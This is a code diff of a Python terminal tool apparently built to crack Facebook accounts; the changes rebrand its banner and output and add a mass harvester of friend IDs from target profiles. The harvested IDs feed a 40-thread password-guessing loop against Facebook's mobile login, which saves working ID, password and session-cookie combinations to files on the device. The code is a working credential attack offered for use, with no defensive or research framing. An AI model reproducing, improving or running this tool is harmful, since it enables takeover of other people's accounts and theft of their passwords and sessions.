@@ -237,6 +237,8 @@ def banner():
 　　　ゝ、　`（ ( ‌° ‌ʖ ‌°) ／
 　　 　　>　 　 　,)
 　　　　　∠_,,,/
+
+     New update by @i4m_hawta
                  ''',width=79,title=f'[bold green]$TAE',style='bold hot_pink2'))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -310,11 +312,14 @@ def login_lagi334():
 def  stae():
 	os.system('clear')
 	banner()
-	print(f" {P}[{hh}01{P}] {B}CRACK FILE")
-	print(f"{P} [{hh}00{P}] {B}LOGOUT ({M}COOKIE{P})")
+	print(f"\x1b[1;94m[ 1 ]CRACK FILE 💀")
+	print(f"\x1b[1;94m[ 2]CRACK ID PUBLIC 💀")
+	#print(f"{P} [{hh}00{P}] {B}LOGOUT ({M}COOKIE{P})")
 	_____alvino__adijaya_____ = input('\n Choose : ')
 	if _____alvino__adijaya_____ in ['1']:
 		File2()
+	if _____alvino__adijaya_____ in ['2']:
+		dump_massal()
 	elif _____alvino__adijaya_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
@@ -395,28 +400,60 @@ def dump_massal():
 		time.sleep(3)
 		back()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
-def dump_public():
+def dump_massal():    
 	try:
 		token = open('.token.txt','r').read()
-		kukis = open('.cok.txt','r').read()
+		cok = open('.cok.txt','r').read()
 	except IOError:
-		exit()
-	print(f'{b} • If You Want to Crack Your Own Friendship')
-	pil = input(f' • Enter Target ID : ')
+	    exit()
 	try:
-		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
-		for pi in koH['friends']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print('')
-		print(f' • Total IDs Collected : {asu}'+str(len(id)))
-		print('')
-		setting()
+		kumpulkan = int(input(f'\n\x1b[30m CHAN ID : '))
+	except ValueError:
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
+	ses=requests.Session()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f'\n\x1b[34m [•] Enter ID  '+str(bilangan)+f' : ')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {'user-agent': 'Mozilla/5.0 (Android; Android 4.4.1; Nokia 3410 Build/IMM76D) AppleWebKit/600.20 (KHTML, like Gecko)  Chrome/49.0.3035.398 Mobile Safari/601.5'
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+	      print(" Total  : "+str(len(id))) 
+	      setting()
 	except requests.exceptions.ConnectionError:
-		print(' • Your Internet Doesnt Exist !')
-		exit()
+	    exit()
 	except (KeyError,IOError):
-		print(' • Friendships Arent Public Or Your Cookies And Tokens Are Rotten')
 		exit()
 def File2():
 			print('')
@@ -432,9 +469,9 @@ def File2():
 			except IOError:
 				exit("{M}[!] FILE  %s NOT FOUND"%(fileX))
 def setting():
-	print(f'{P}[{H}01{P}] {b}Crack Old')
-	print(f'{P}[{H}02{P}] {b}Crack New')
-	print(f'{P}[{H}03{P}] {b}Random ID')
+	#print(f'{P}[{H}01{P}] {b}Crack Old')
+	#print(f'{P}[{H}02{P}] {b}Crack New')
+	print(f'\x1b[1;96mRANDOM CRACK FACEBOOK⭐️')
 	hu = input(x+'['+p+'f'+x+'] Choose : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -459,7 +496,7 @@ def setting():
 def passwrd():
 	with ThreadPool(max_workers=40) as pool:
 		total_ids = str(len(id))
-		print ("  \033[1;97m[\033[1;92m•\033[1;97m]Crack start injoy")
+		#print ("  \033[1;97m[\033[1;92m•\033[1;97m]Crack start injoy")
 		for user in id:
 			idf,name = user.split('|')[0],user.split('|')[1].lower() 
 			pwv = []
@@ -537,7 +574,7 @@ def crack(idf,pwv):
 	#bo = random.choice([m,k,h,b,u,x])
 	#sys.stdout.write(f"\r [a7a] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
 	#sys.stdout.flush()
-	sys.stdout.write('\r\033[1;37m [RaWa] %s|\033[1;32mOK:-%s\033[1;37m \x1b[1;91mCP:-%s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
+	sys.stdout.write('\r\x1b[1;96m[Hawa] %s|\x1b[1;91mOK🦅%s\033[1;30m \x1b[1;91mCP❌%s\x1b[1;95m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen)
 	ses = requests.Session()
@@ -583,7 +620,7 @@ def crack(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 			if "c_user" in ses.cookies.get_dict().keys():
-				print (' \x1b[1;92m[$TAE-OK] ID:'+idf+':'+pw+kuki)
+				print (' \x1b[1;96m[Hawa-OK] ID:'+idf+':'+pw+kuki)
 				open('/sdcard/$TAE-OK.txt','a').write(idf+'|'+pw+kuki+'\n')
 				try:
 					pi = ses.get('https://m.facebook.com/').text
@@ -599,7 +636,7 @@ def crack(idf,pwv):
 				
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print (f' \x1b[1;91m[$TAE-CP] ID:'+idf+'PASS'+pw)
+				print (f' \x1b[1;91m[Hawa-CP] ID:'+idf+'PASS'+pw)
 				cps.append(idf)
 				open('/sdcard/$TAE-CP.txt','a').write(idf+'|'+pw+'\n')
 				break
